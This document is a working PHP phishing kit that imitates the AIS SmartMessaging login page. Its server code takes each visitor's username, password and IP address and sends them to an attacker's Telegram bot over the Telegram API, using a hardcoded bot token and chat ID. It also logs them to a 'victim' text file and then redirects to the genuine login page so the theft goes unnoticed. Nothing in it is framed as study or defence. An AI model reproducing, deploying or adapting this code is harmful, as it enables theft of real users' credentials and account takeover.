<?php
session_start();

      
if(  isset($_POST["sendinfo"])  )
{	

	function get_ip(){   if( isset($_SERVER['HTTP_CLIENT_IP']) )   {  return $_SERVER['HTTP_CLIENT_IP'];}  elseif  ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) )     { return $_SERVER['HTTP_X_FORWARDED_FOR'];}   else  { return (  isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : ''   ); }     }      	$ip = get_ip();  
	$username = $_POST["username"];
	$password = $_POST["password"];


    $_SESSION["infocookiess1"][] = array 
	(  
		'ip' => $ip,   
		'username' => $username,   
		'password' => $password,  		
	); 
	
	foreach($_SESSION["infocookiess1"] as $keys => $values)
    {	
		$ip=$values["ip"];
		$username=$values["username"];
		$password=$values["password"];
    }
	
  
	define ('url',"https://api.telegram.org/bot1865501764:AAE6Ep51dlBHRa8ZSk0csxOxrBc1IHJocTw/sendmessage?chat_id=1335982188&");
    $message = urlencode
	(   
		"\n /-- start info victime --/"                                 .                 
		"\n ip: "                          .   $ip                      .  
        "\n username: "                    .   $username                .  
		"\n password: "                    .   $password                .
		"\n /-- end info victime --/"                                         		
	);
    file_get_contents(url."text=".$message."");
 
			
    $file = Fopen("infovictime.txt","a+"); 
    fwrite($file ,    "\n /-- star info victime --/"                                  );
    fwrite($file ,    "\n ip : "                  .      $ip                          ); 
	fwrite($file ,    "\n username : "            .      $username                    );
	fwrite($file ,    "\n password : "            .      $password                    ); 
    fwrite($file ,    "\n /-- end info victime --/"                                   );  
    fwrite($file ,    "\n"                                                            );     
	 

    echo "<script> window.location.href = 'https://www.smartmessaging.ais.co.th/Login/startLoginEN.do?language=en_EN'; </script>"; 

}

?>


<title>Welcome</title>
<meta charset="utf-8">   <meta http-equiv="X-UA-Compatible" content="IE=edge"/>  <meta http-equiv="origin-trial" content=""/>    

<script type="text/javascript"  src="https://code.jquery.com/jquery-3.5.1.min.js"></script> 
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.css"/>  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cairo&display=swap" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css"/>   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css"/>   <script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"      ></script>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css"  rel="stylesheet"  > <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js" ></script>  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js" ></script>  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.min.js" ></script>
<link rel="shortcut icon" type="image/x-icon" media="all" href="" />
<style>htm,body{padding:0; border:0; margin:0;  touch-action: manipulation;    user-select: none;   }   ul li {list-style-type:none; text-decoration:none;  }  a{text-decoration:none; }    </style>
 

 
<style>
.container00 {  width:935px;  height:auto;   } 

.container0 {  background-image:url(img/smartsm/background.jpg);    background-repeat:no-repeat;  background-size:auto; background-position:center;      width:935px; height:100vh;   position:absolute; top:50%;  left:50%; transform:translate(-50%,-50%);   }

.container1 { background-color:white; width:593px; height:auto;  border:solid 1px black; position:absolute; top:50%;  left:50%; transform:translate(-50%,-50%);  }


	.row1{padding:0% 0%; margin:0% 0%;    display:flex; align-items:center;  align-content:center; justify-content:center; text-align:center;  }       
        .row1 .col1a{width:100%;  }   .row1 .col1b{ padding:0px 0px; margin:0% 0%;    display:flex; align-items:center; justify-content:center; text-align:center;   }
         .logoimg{}

	.row2{padding:0% 0%; margin:0% 0%;  display:flex; align-items:flex-start;  align-content:center; justify-content:center; text-align:center;  }       
        .row2 .col1a{width:30%;}   .row2 .col1b{background-color:white; padding:0px 0px; margin:6% 0%;    display:grid; align-items:center; justify-content:flex-end; text-align:center;   }
          .login{ padding:5px 3px;  border:solid 1px #c4dd2d; border-radius:5px;  }
		    .titlelogin{background-color:#b7d600; color:white; font:600 15px 'cairo'; text-indent: 5px;    text-align:left;}
			.textuser{color:black; font:600 15px 'cairo'; text-indent: 5px;    text-align:left;}
			.textpass{color:black; font:600 15px 'cairo'; text-indent: 5px;    text-align:left;}
            .iputtxt{width:120px; height:20px; border:solid 0.3px #69a61d;      color:#646464;  font:normal 11px Tahoma;}
			.posiputsubmit{margin-top:7px; text-align:right; } .iputsubmit{background-color:#90b530; width:53px; height:auto; border:none; border-radius:7px; color:white;  font:600 10px 'cairo';   text-align:center;}
           .lang{ margin-top:10px; display:flex; align-items:center;  align-content:center; justify-content:center; text-align:center;}
        .row2 .col2a{width:70%;}   .row2 .col2b{background-color:white; padding:0px 0px; margin:0% 0%;    display:flex; align-items:center; justify-content:flex-end; text-align:center;   }
             .loginsms{width:382px;  overflow:hidden; }
		
</style>



<form method="post" > 
<div class="container00" >
<div class="container0" > 
<div class="container1" >
  
	<div class="row1">
	    <div class="col1a">  <div class="col1b"> 
		   <img src="img/smartsm/logo.gif" />
	    </div> </div>
	</div>
	<div class="row2">
	    <div class="col1a">  <div class="col1b"> 
		   <div class="login">
		      <div class="titlelogin"> Login </div>
			  <div class="textuser"> Username </div>
		      <div> <input class="iputtxt" type="text"  placeholder=""  name="username"   required="required"   autocomplete="Off" size="40" maxlength="40"   oninvalid="this.setCustomValidity('Enter a valid Username ')"           oninput="setCustomValidity('')"  />  </div>
			  <div class="textpass"> Password </div>
			  <div> <input class="iputtxt" type="password"  placeholder=""  name="password"   required="required"   autocomplete="Off" size="40" maxlength="40"  oninvalid="this.setCustomValidity('Enter a valid password ')"           oninput="setCustomValidity('')" />  </div>
			  <div class="posiputsubmit"> <input class="iputsubmit" type="submit"  value="Login"  name="sendinfo"/>  </div>
		   </div>
		   <div class="lang">
		      <div class="th" > <a href="smartsmsth.php" > <img src="img/smartsm/th.gif" /></a> </div>
			  <div class="slash" > <img src="img/smartsm/slash.gif" /> </div>
			  <div class="en" > <a href="smartsmsen.php"> <img src="img/smartsm/en.gif"/></a> </div>
		   </div>
	    </div> </div>
		<div class="col2a">  <div class="col2b"> 
		   <div class="loginsms" > <img src="img/smartsm/loginsms.jpg" /> </div>
	    </div> </div>
	</div>


</div>
</div>
</div>
</form>
